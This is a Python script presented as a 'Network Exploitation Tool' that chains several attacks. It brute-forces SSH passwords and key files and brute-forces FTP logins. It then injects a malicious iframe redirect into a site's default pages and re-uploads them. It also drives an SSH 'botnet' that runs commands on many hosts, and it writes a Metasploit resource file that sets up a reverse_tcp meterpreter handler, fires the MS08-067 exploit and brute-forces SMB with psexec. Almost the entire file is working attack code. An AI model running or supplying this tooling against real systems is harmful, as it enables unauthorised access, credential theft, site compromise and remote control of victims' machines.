import argparse
# from threading import *
import nmap
import pexpect
from pexpect import pxssh
import os
import ftplib
import concurrent.futures
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Function for checking the state of port on the web-server (open/closed)
def nmap_scan(tgt_host, tgt_port):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(tgt_host, tgt_port)
    state = nm_scan[tgt_host]['tcp'][int(tgt_port)]['state']
    logger.info(f"[*] {tgt_host} tcp/{tgt_port} {state}")

# Function which provides an SSH connection to a remote host.
def ssh_connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    conn_str = f'ssh {user}@{host}'
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0: # timeout
        logger.error('[-] Error Connecting')
        return None
    if ret == 1: # ssh key
        child.sendline('yes')
        ret = child.expect(([pexpect.TIMEOUT, '[P|p]assword:']))
        if ret == 0:
            logger.error('[-] Error Connecting')
            return None
    child.sendline(password)
    child.expect(pexpect.EOF)
    return child


# Bruteforce for select ssh password
def brute_ssh(host, user, passwd_file):
    max_connections = 5  # threads for bruteforce
    found = False  # correct or incorrect password
    fails = 0  # unsuccessful tries

    # internal function connect, which attempts to connect to the host using the given password
    def connect(password):
        nonlocal found, fails
        try:
            s = ssh_connect(user, host, password)
            if s:
                logger.info(f'[+] Password Found: {password}')
                found = True
        except Exception as e:
            logger.error(f'[-] Error Connecting: {e}')
            fails += 1
        finally:
            return

    if host is None or passwd_file is None or user is None:
        logger.error('Please provide the target host, password file, and user')
        return

    with open(passwd_file, 'r') as f:
        passwords = f.read().splitlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_connections) as executor:
        futures = {executor.submit(connect, password): password for password in passwords}
        for future in concurrent.futures.as_completed(futures):
            pass

# Function which attempts to exploit a vulnerability in the SSH system using given keys.
def exploit_ssh(host, user, pass_dir):
    max_connections = 5
    stop = False
    fails = 0

    def connect(keyfile):
        nonlocal stop, fails
        try:
            perm_denied = 'Permission denied'
            ssh_newkey = 'Are you sure you want to continue'
            conn_closed = 'Connection closed by remote host'
            opt = ' -o PasswordAuthentication=no'
            conn_str = f'ssh {user}@{host} -i {keyfile} {opt}'
            child = pexpect.spawn(conn_str)
            ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
            if ret == 2:
                print('[-] Adding Host to ~/.ssh/known_hosts')
                child.sendline('yes')
                connect(keyfile)
            elif ret == 3:
                print('[-] Connection Closed By Remote Host')
                fails += 1
            elif ret > 3:
                logger.info(f'[+] Success. {keyfile}')
                stop = True

        except Exception as e:
            logger.error(f'[-] Error Connecting: {e}')

        finally:
            return

    if host is None or pass_dir is None or user is None:
        logger.error('Please provide the target host, password directory, and user')
        return

    for filename in os.listdir(pass_dir):
        if stop:
            logger.info('[*] Exiting: Key Found.')
            return
        if fails > 5:
            logger.error('[!] Exiting: Too Many Connections Closed By Remote Host.')
            logger.error('[!] Adjust number of simultaneous threads.')
            return
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_connections) as executor:
            futures = {executor.submit(connect, os.path.join(pass_dir, filename)): filename}
            for future in concurrent.futures.as_completed(futures):
                pass

#
def ftp_exploit(hostname, passwd_file, redirect):
    def anon_login(hostname):
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login('anonymous', 'me@your.com')
            logger.info(f'[*] {hostname} FTP Anonymous Logon Succeeded.')
            ftp.quit()
            return True
        except Exception as e:
            logger.error(f'[-] {hostname} FTP Anonymous Logon Failed.')
            return False

    def brute_login(hostname, passwd_file):
        with open(passwd_file, 'r') as pF:
            for line in pF.readlines():
                username, password = line.split(':')
                username = username.strip()
                password = password.strip()
                logger.info(f'[+] Trying: {username}/{password}')
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(username, password)
                    logger.info(f'[*] {hostname} FTP Logon Succeeded: {username}/{password}')
                    ftp.quit()
                    return (username, password)
                except Exception as e:
                    pass
            logger.error('[-] Could not brute force FTP credentials.')
            return (None, None)

    def return_default(ftp):
        try:
            dir_list = ftp.nlst()
        except:
            dir_list = []
            logger.error('[-] Could not list directory contents.')
            logger.error('[-] Skipping To Next Target.')
            return
        ret_list = []
        for file_name in dir_list:
            fn = file_name.lower()
            if '.php' in fn or '.htm' in fn or '.asp' in fn:
                logger.info(f'[+] Found default page: {file_name}')
                ret_list.append(file_name)
        return ret_list

    def inject_page(ftp, page, redirect):
        with open(page + '.tmp', 'w') as f:
            ftp.retrlines('RETR ' + page, f.write)
            logger.info(f'[+] Downloaded Page: {page}')
            f.write(redirect)
            logger.info(f'[+] Injected Malicious IFrame on: {page}')
            ftp.storlines('STOR ' + page, open(page + '.tmp', 'rb'))
            logger.info(f'[+] Uploaded Injected Page: {page}')

    def attack(username, password, tgt_host, redirect):
        ftp = ftplib.FTP(tgt_host)
        ftp.login(username, password)
        def_pages = return_default(ftp)
        for def_page in def_pages:
            inject_page(ftp, def_page, redirect)

    if anon_login(hostname):
        return
    username, password = brute_login(hostname, passwd_file)
    if username and password:
        attack(username, password, hostname, redirect)


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            logger.error(f'[-] Error Connecting: {e}')

    def send_command(self, cmd):
        try:
            self.session.sendline(cmd)
            self.session.prompt()
            return self.session.before
        except Exception as e:
            logger.error(f'[-] Error Sending Command: {e}')


def botnet_command(command, bot_net):
    for client in bot_net:
        output = client.send_command(command)
        logger.info(f'[*] Output from {client.host}:')
        logger.info(f'[+] {output.decode()}')

# Функция для настройки обработчика в Metasploit
def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    config_file.write(f'set LPORT {lport}\n')
    config_file.write(f'set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')

# Функция для эксплуатации уязвимости Conficker
def conficker_exploit(config_file, tgt_host, lhost, lport):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
    config_file.write(f'set RHOST {tgt_host}\n')
    config_file.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    config_file.write(f'set LPORT {lport}\n')
    config_file.write(f'set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')


# Функция для перебора паролей SMB
def smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    username = 'Administrator'
    with open(passwd_file, 'r') as pF:
        for password in pF.readlines():
            password = password.strip('\n').strip('\r')
            config_file.write('use exploit/windows/smb/psexec\n')
            config_file.write(f'set SMBUser {username}\n')
            config_file.write(f'set SMBPass {password}\n')
            config_file.write(f'set RHOST {tgt_host}\n')
            config_file.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {lport}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')


def main():
    parser = argparse.ArgumentParser(description='Network Exploitation Tool')
    parser.add_argument('-H', dest='tgt_host', type=str, help='specify target host')
    parser.add_argument('-F', dest='passwd_file', type=str, help='specify password file')
    parser.add_argument('-u', dest='user', type=str, help='specify the user')
    parser.add_argument('-p', dest='port', type=str, help='specify the port[s] separated by comma')
    parser.add_argument('-D', dest='pass_dir', type=str, help='specify the directory with keys')
    parser.add_argument('-l', dest='lhost', type=str, help='specify the local host')
    parser.add_argument('-L', dest='lport', type=int, help='specify the local port')
    parser.add_argument('-c', dest='command', type=str, help='specify command to execute')
    parser.add_argument('-t', dest='targets', type=str, help='specify targets file')
    args = parser.parse_args()

    tgt_host = args.tgt_host
    tgt_ports = str(args.port).split(',')
    passwd_file = args.passwd_file
    user = args.user
    pass_dir = args.pass_dir
    lhost = args.lhost
    lport = args.lport
    command = args.command
    targets = args.targets

    if tgt_host is None or user is None:
        logger.error('Please provide the target host and user')
        return

    if command:
        bot_net = []
        with open(targets, 'r') as file:
            for line in file:
                host = line.strip()
                client = Client(host, user, passwd_file)
                bot_net.append(client)
        botnet_command(command, bot_net)
    else:
        for tgt_port in tgt_ports:
            nmap_scan(tgt_host, tgt_port)
            if passwd_file:
                brute_ssh(tgt_host, user, passwd_file)
            if pass_dir:
                exploit_ssh(tgt_host, user, pass_dir)
            if lhost and lport:
                with open('meta_config.rc', 'w') as config_file:
                    setup_handler(config_file, lhost, lport)
                    conficker_exploit(config_file, tgt_host, lhost, lport)
                    smb_brute(config_file, tgt_host, passwd_file, lhost, lport)
                    logger.info('[*] MetaConfig File Created: meta_config.rc')
                    print()





if __name__ == '__main__':
    main()









